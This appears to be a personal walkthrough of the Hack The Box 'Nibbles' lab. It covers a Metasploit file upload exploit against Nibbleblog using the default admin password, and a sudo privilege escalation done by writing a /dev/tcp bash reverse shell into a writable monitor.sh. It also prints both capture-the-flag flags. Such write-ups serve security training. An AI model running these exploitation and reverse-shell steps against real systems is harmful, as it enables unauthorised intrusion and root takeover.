# Nibbles
## Nmap Scan Result:

/home/kali/NOTES/CPTS/Nibbles-HTB/scan.png

After accessing web server on port 80:

/home/kali/NOTES/CPTS/Nibbles-HTB/nibble1.png

Viewing the page source we find an interesting directory ```/nibbleblog```

/home/kali/NOTES/CPTS/Nibbles-HTB/source.png

After Checking metasploit "nibbleblog" seems to be vulnerable to a file upload exploit.

/home/kali/NOTES/CPTS/Nibbles-HTB/exploit1.png

run ```use 0``` to use the exploit

set ```RHOST``` to the target IP

set ```LHOST``` to your HTB VPN IP

set ```TARGETURI``` to ```/nibbleblog```

set ```USERNAME``` to admin

set ```PASSWORD``` to nibbles

run ```exploit``` to start the exploit

Now we have a meterpreter session

/home/kali/NOTES/CPTS/Nibbles-HTB/meterpreter.png

We can find our user flag in ```/home/nibbler```

/home/kali/NOTES/CPTS/Nibbles-HTB/flag1.png

user flag: 79c03865431abf47b90ef24b9695e148

Before we begin to escalate privileges let's change our meterpreter session to a shell session because a meterpreter doesn't support some key Linux commands. To do this just run ```shell``` in your meterpreter

Then run ```python3 -c "import pty; pty.spawn('/bin/bash')"``` to stabilize the shell.

Let's run ```sudo -l``` to see commands we can run sudo without password.

/home/kali/NOTES/CPTS/Nibbles-HTB/sudo.png
We're allowed to run a script ```monitor.sh``` without password

We can find this script when we unzip the personal.zip file in the nibbler home directory.

/home/kali/NOTES/CPTS/Nibbles-HTB/unzip.png

We can find the script in ```/home/nibbler/personal/stuff``` so we ```cd``` into it.

Since we have read, write, and execute privileges to the monitor.sh we can write a reverse shell into it then execute it as sudo and hopefully we'll get root.

```echo "/bin/bash -l > /dev/tcp/<your HTB VPN>/4242 0<&1 2>&1" > monitor.sh```

For Some reason i was having issues running the ```monitor.sh``` script on our target so i had to write my own ```monitor.sh``` on my machine the sent it to our target using python http server.

/home/kali/NOTES/CPTS/Nibbles-HTB/script.png

Now let's set our netcat to listen on port 4242 ```nc -lvp 4242``` (Do this on another terminal instance).

Now we can run ```sudo /home/nibbler/personal/stuff/monitor.sh```

Nice!! We have root privileges now

/home/kali/NOTES/CPTS/Nibbles-HTB/root.png

We can find the root flag ```root.txt``` in ```/root```

/home/kali/NOTES/CPTS/Nibbles-HTB/flag2.png

root flag: de5e5d6619862a8aa5b9b212314e0cdd
